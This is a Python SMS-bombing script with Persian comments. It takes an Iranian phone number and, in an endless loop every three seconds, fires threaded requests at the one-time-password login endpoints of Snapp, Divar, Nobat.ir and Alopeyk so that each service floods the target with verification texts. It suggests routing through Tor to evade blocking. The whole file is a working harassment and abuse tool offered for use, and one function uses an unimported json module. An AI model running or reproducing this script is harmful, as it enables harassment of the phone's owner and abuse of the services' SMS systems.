#Mr Baji
import os
import time
import requests
from threading import Thread

#Proxy using is optional
proxy = ""
#For using proxy you should install Tor on your system.
def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        if "OK" in snapR.text:
            print ("sended sms:)")
        else:
            print ("Error!")
    except:
        print ("Error!")

def divar(phone):

    url = 'https://api.divar.ir/v5/auth/authenticate'

    phone_value = {"cellphone": phone}
    
    try:
        
        response = requests.post(url, json=phone_value)
        
        if response.status_code == 200:
            print("پاسخ از سرویس Divar:", response.json())
        else:
            print("خطا در ارتباط با سرویس Divar:", response.text)
    except Exception as e:
        print("خطا:", e)

def nobatir(phone):
    # آدرس API سرویس Nobat.ir
    url = 'https://nobat.ir/api/public/patient/login/phone'
    # داده برای ارسال
    phone_value = {
        'cellphone': phone
    }
    # هدر درخواست
    headers = {
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'
    }
    
    try:
        # ارسال درخواست POST به آدرس مورد نظر
        response = requests.post(url, data=phone_value, headers=headers)
        # بررسی و چاپ پاسخ دریافتی
        if response.status_code == 200:
            print("پاسخ از سرویس Nobat.ir:", response.json())
        else:
            print("خطا در ارتباط با سرویس Nobat.ir:", response.text)
    except Exception as e:
        print("خطا:", e)

def alopeyk_login(phone):
    # حذف صفر ابتدایی شماره تلفن
    phone = int(phone)
    # آدرس API سرویس Alopeyk
    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
    # داده برای ارسال
    phone_value = {
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "phone": str(phone)  # تبدیل شماره تلفن به رشته
    }
    # هدر درخواست
    headers = {
        'content-type': 'application/json'
    }
    
    try:
        # ارسال درخواست POST به آدرس مورد نظر
        response = requests.post(url, data=json.dumps(phone_value), headers=headers)
        # بررسی و چاپ پاسخ دریافتی
        if response.status_code == 200:
            print("پاسخ از سرویس Alopeyk:", response.json())
        else:
            print("خطا در ارتباط با سرویس Alopeyk:", response.text)
    except Exception as e:
        print("خطا:", e)

def main():
    phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=nobatir, args=[phone]).start()
        Thread(target=alopeyk_login, args=[phone]).start()


        # os.system("killall -HUP tor")
        time.sleep(3)


if __name__ == "__main__":
    main()

